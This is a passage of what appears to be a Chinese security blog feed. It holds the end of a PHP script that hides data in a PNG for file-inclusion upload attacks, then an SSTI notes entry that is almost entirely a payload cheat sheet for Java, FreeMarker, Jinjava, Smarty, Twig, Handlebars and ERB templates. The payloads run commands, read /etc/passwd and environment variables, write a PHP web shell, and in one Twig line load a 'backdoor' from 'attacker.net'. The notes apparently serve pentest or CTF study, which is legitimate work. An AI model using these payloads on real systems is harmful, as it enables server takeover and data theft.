class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>)<span class="hljs-comment">;</span><br> <br> <br> <br>$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>)<span class="hljs-comment">;</span><br> <br>for ($y = <span class="hljs-number">0</span><span class="hljs-comment">; $y &lt; sizeof($p); $y += 3) &#123;</span><br>   $r = $p[$y]<span class="hljs-comment">;</span><br>   $g = $p[$y+<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>   $b = $p[$y+<span class="hljs-number">2</span>]<span class="hljs-comment">;</span><br>   $color = imagecolorallocate($img, $r, $g, $b)<span class="hljs-comment">;</span><br>   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color)<span class="hljs-comment">;</span><br>&#125;<br> <br>imagepng($img,<span class="hljs-string">&#x27;./1.png&#x27;</span>)<span class="hljs-comment">;</span><br>?&gt;<br></code></pre></td></tr></table></figure><p>1.准备png图片<br>2.在cmd使用php命令执行该脚本生成新png图片<br>3.使用新图片上传<br>4.在文件包含漏洞处进行传参</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/08/10：ssti笔记</title>
    <link href="/2023/08/10/sstinote/"/>
    <url>/2023/08/10/sstinote/</url>
    
    <content type="html"><![CDATA[<p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p><h2 id="模板类型判断"><a href="#模板类型判断" class="headerlink" title="模板类型判断"></a>模板类型判断</h2><img src="/2023/08/10/sstinote/ssti.png" class=""><img src="/2023/08/10/sstinote/ssti2.png" class=""><p>可用判断语句<code>$&#123;&#123;<%[%'"&#125;&#125;%\</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">$&#123;7*7&#125;</span><br><span class="language-xml">&lt;%= 7*7 %&gt;</span><br><span class="language-xml">$</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#&#123;7*7&#125;</span><br><span class="language-xml">*&#123;7*7&#125;</span><br></code></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="Java-Basic-injection"><a href="#Java-Basic-injection" class="headerlink" title="Java - Basic injection"></a>Java - Basic injection</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$&#123;</span><span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;<br><span class="hljs-variable">$&#123;</span>&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;<br><span class="hljs-variable">$&#123;</span><span class="hljs-keyword">class</span>.getClassLoader()&#125;<br><span class="hljs-variable">$&#123;</span><span class="hljs-keyword">class</span>.getResource(<span class="hljs-string">&quot;&quot;</span>).getPath()&#125;<br><span class="hljs-variable">$&#123;</span><span class="hljs-keyword">class</span>.getResource(<span class="hljs-string">&quot;../../../../../index.htm&quot;</span>).getContent()&#125;<br></code></pre></td></tr></table></figure><h3 id="Java-Retrieve-the-system’s-environment-variables"><a href="#Java-Retrieve-the-system’s-environment-variables" class="headerlink" title="Java - Retrieve the system’s environment variables"></a>Java - Retrieve the system’s environment variables</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;<span class="hljs-built_in">T</span>(java.lang.System)<span class="hljs-selector-class">.getenv</span>()&#125;<br></code></pre></td></tr></table></figure><h3 id="Java-Retrieve-etc-passwd"><a href="#Java-Retrieve-etc-passwd" class="headerlink" title="Java - Retrieve /etc/passwd"></a>Java - Retrieve /etc/passwd</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;cat etc/passwd&#x27;</span>)&#125;<br><br>$&#123;<span class="hljs-built_in">T</span>(org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span>.IOUtils)<span class="hljs-selector-class">.toString</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>)<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">116</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">32</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">47</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">101</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">116</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">47</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">112</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">119</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">100</span>)))<span class="hljs-selector-class">.getInputStream</span>())&#125;<br></code></pre></td></tr></table></figure><h3 id="FreeMarker-Java"><a href="#FreeMarker-Java" class="headerlink" title="FreeMarker (Java)"></a>FreeMarker (Java)</h3><p>判断类型：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;&#123;7<span class="hljs-number">*7</span>&#125;&#125; = &#123;&#123;7<span class="hljs-number">*7</span>&#125;&#125;<br><span class="hljs-variable">$&#123;7*7&#125;</span> = 49<br><span class="hljs-comment">#&#123;7*7&#125; = 49 -- (legacy)</span><br><span class="hljs-variable">$&#123;7*&#x27;7&#x27;&#125;</span> <span class="hljs-literal">Nothing</span><br><span class="hljs-variable">$&#123;foobar&#125;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;#assign <span class="hljs-keyword">ex</span> = <span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123; <span class="hljs-keyword">ex</span>(<span class="hljs-string">&quot;id&quot;</span>)&#125;<br>[#assign <span class="hljs-keyword">ex</span> = <span class="hljs-string">&#x27;freemarker.template.utility.Execute&#x27;</span>?<span class="hljs-keyword">new</span>()]$&#123; <span class="hljs-keyword">ex</span>(<span class="hljs-string">&#x27;id&#x27;</span>)&#125;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;id&quot;</span>)&#125;<br><br>$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().<span class="hljs-built_in">resolve</span>(<span class="hljs-string">&#x27;/home/carlos/my_password.txt&#x27;</span>).toURL().openStream().readAllBytes()?<span class="hljs-keyword">join</span>(<span class="hljs-string">&quot; &quot;</span>)&#125;<br></code></pre></td></tr></table></figure><h3 id="Freemarker-Sandbox-bypass（版本低于2-3-30）"><a href="#Freemarker-Sandbox-bypass（版本低于2-3-30）" class="headerlink" title="Freemarker - Sandbox bypass（版本低于2.3.30）"></a>Freemarker - Sandbox bypass（版本低于2.3.30）</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-selector-id">#assign</span> classloader=<span class="hljs-selector-tag">article</span><span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.protectionDomain</span>.classLoader&gt;<br>&lt;<span class="hljs-selector-id">#assign</span> owc=classloader<span class="hljs-selector-class">.loadClass</span>(<span class="hljs-string">&quot;freemarker.template.ObjectWrapper&quot;</span>)&gt;<br>&lt;<span class="hljs-selector-id">#assign</span> dwf=owc<span class="hljs-selector-class">.getField</span>(<span class="hljs-string">&quot;DEFAULT_WRAPPER&quot;</span>)<span class="hljs-selector-class">.get</span>(null)&gt;<br>&lt;<span class="hljs-selector-id">#assign</span> ec=classloader<span class="hljs-selector-class">.loadClass</span>(<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>)&gt;<br>$&#123;dwf<span class="hljs-selector-class">.newInstance</span>(ec,null)(<span class="hljs-string">&quot;id&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><h3 id="Jinjava-Java"><a href="#Jinjava-Java" class="headerlink" title="Jinjava (Java)"></a>Jinjava (Java)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123;<span class="hljs-string">&#x27;a&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;javax.script.ScriptEngineManager&#x27;</span>).newInstance().getEngineByName(<span class="hljs-string">&#x27;JavaScript&#x27;</span>).<span class="hljs-built_in">eval</span>(\&quot;new java.lang.String(<span class="hljs-string">&#x27;xxx&#x27;</span>)\&quot;)&#125;&#125;<br><br>&#123;&#123;<span class="hljs-string">&#x27;a&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;javax.script.ScriptEngineManager&#x27;</span>).newInstance().getEngineByName(<span class="hljs-string">&#x27;JavaScript&#x27;</span>).<span class="hljs-built_in">eval</span>(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;<span class="hljs-built_in">whoami</span>\\\&quot;); x.start()\&quot;)&#125;&#125;<br><br>&#123;&#123;<span class="hljs-string">&#x27;a&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;javax.script.ScriptEngineManager&#x27;</span>).newInstance().getEngineByName(<span class="hljs-string">&#x27;JavaScript&#x27;</span>).<span class="hljs-built_in">eval</span>(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;<br><br>&#123;&#123;<span class="hljs-string">&#x27;a&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;javax.script.ScriptEngineManager&#x27;</span>).newInstance().getEngineByName(<span class="hljs-string">&#x27;JavaScript&#x27;</span>).<span class="hljs-built_in">eval</span>(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;<span class="hljs-built_in">uname</span>\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="Smarty-PHP"><a href="#Smarty-PHP" class="headerlink" title="Smarty (PHP)"></a>Smarty (PHP)</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#123;$smarty.version&#125;</span><br><span class="language-xml">&#123;php&#125;echo `id`;&#123;/php&#125; //deprecated in smarty v3</span><br><span class="language-xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;,self::clearConfig())&#125;</span><br><span class="language-xml">&#123;system(&#x27;ls&#x27;)&#125; // compatible v3</span><br><span class="language-xml">&#123;system(&#x27;cat index.php&#x27;)&#125; // compatible v3</span><br></code></pre></td></tr></table></figure><h3 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig (PHP)"></a>Twig (PHP)</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"> = 49</span><br><span class="language-xml">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><span class="language-xml"> = 49</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">1/0</span>&#125;&#125;</span><span class="language-xml"> = Error</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">foobar</span>&#125;&#125;</span><span class="language-xml"> Nothing</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#Get Info</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self</span>&#125;&#125;</span><span class="language-xml"> #(Ref. to current application)</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dump</span>(<span class="hljs-name">app</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">app.request.server.all</span>|join(<span class="hljs-name">&#x27;,&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#File read</span><br><span class="language-xml">&quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="hljs-name">1</span>,<span class="hljs-number">30</span>)&#125;&#125;</span><span class="language-xml">&quot;@</span><br><span class="language-xml"></span><br><span class="language-xml">#Exec code</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.setCache</span>(<span class="hljs-name">&quot;ftp://attacker.net:2121&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.loadTemplate</span>(<span class="hljs-name">&quot;backdoor&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;whoami&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id;uname -a;hostname&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&#x27;id&#x27;]</span>|filter(<span class="hljs-name">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&#x27;cat\x20/etc/passwd&#x27;]</span>|filter(<span class="hljs-name">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&#x27;cat$IFS/etc/passwd&#x27;]</span>|filter(<span class="hljs-name">&#x27;system&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Handlebars-NodeJS"><a href="#Handlebars-NodeJS" class="headerlink" title="Handlebars (NodeJS)"></a>Handlebars (NodeJS)</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;&#123;#with <span class="hljs-string">&quot;s&quot;</span> as |<span class="hljs-keyword">string</span>|&#125;&#125;<br>  &#123;&#123;#with <span class="hljs-string">&quot;e&quot;</span>&#125;&#125;<br>    &#123;&#123;#with split as |conslist|&#125;&#125;<br>      &#123;&#123;this.pop&#125;&#125;<br>      &#123;&#123;this.push (lookup <span class="hljs-keyword">string</span>.sub <span class="hljs-string">&quot;constructor&quot;</span>)&#125;&#125;<br>      &#123;&#123;this.pop&#125;&#125;<br>      &#123;&#123;#with <span class="hljs-keyword">string</span>.split as |codelist|&#125;&#125;<br>        &#123;&#123;this.pop&#125;&#125;<br>        &#123;&#123;this.push <span class="hljs-string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;<br>        &#123;&#123;this.pop&#125;&#125;<br>        &#123;&#123;#each conslist&#125;&#125;<br>          &#123;&#123;#with (<span class="hljs-keyword">string</span>.sub.apply <span class="hljs-number">0</span> codelist)&#125;&#125;<br>            &#123;&#123;this&#125;&#125;<br>          &#123;&#123;/with&#125;&#125;<br>        &#123;&#123;/each&#125;&#125;<br>      &#123;&#123;/with&#125;&#125;<br>    &#123;&#123;/with&#125;&#125;<br>  &#123;&#123;/with&#125;&#125;<br>&#123;&#123;/with&#125;&#125;<br><br>URLencoded:<br>%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D<br></code></pre></td></tr></table></figure><h3 id="ERB-Ruby"><a href="#ERB-Ruby" class="headerlink" title="ERB (Ruby)"></a>ERB (Ruby)</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"> = </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="language-xml">&lt;%= 7*7 %&gt; = 49</span><br><span class="language-xml">&lt;%= foobar %&gt; = Error</span><br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%= <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>) %&gt; #Execute code<br>&lt;%= Dir.entries(<span class="hljs-string">&#x27;/&#x27;</span>) %&gt; #List folder<br>&lt;%= File.open(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read %&gt; #Read <span class="hljs-keyword">file</span><br><br>&lt;%= <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /etc/passwd&#x27;</span>) %&gt;<br>&lt;%= <span class="hljs-string">`ls /`</span> %&gt;<br>&lt;%= IO.<span class="hljs-keyword">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).readlines()  %&gt;<br>&lt;% require <span class="hljs-string">&#x27;open3&#x27;</span> %&gt;&lt;% @a,@b,@c,@d=Open3.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= @b.readline()%&gt;<br>&lt;% require <span class="hljs-string">&#x27;open4&#x27;</span> %&gt;&lt;% @a,@b,@c,@d=Open4.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= @c.readline()%&gt;<br></code></pre></td></tr></table></figure><h3 id="Tornado-Python"><a href="#Tornado-Python" class="headerlink" title="Tornado (Python)"></a>Tornado (Python)</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"> = 49</span><br><span class="language-xml">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">foobar</span>&#125;&#125;</span><span class="language-xml"> = Error</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><span class="language-xml"> = 7777777</span><br></code></pre></td></tr></table></figure><h3 id="Jinja2-Python"><a href="#Jinja2-Python" class="headerlink" title="Jinja2 (Python)"></a>Jinja2 (Python)</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"> = Error</span><br><span class="language-xml">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">foobar</span>&#125;&#125;</span><span class="language-xml"> Nothing</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">4</span>*<span class="hljs-number">4</span>&#125;&#125;</span><span class="language-xml">[[5*5]]</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><span class="language-xml"> = 7777777</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.items</span>()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">settings.SECRET_KEY</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 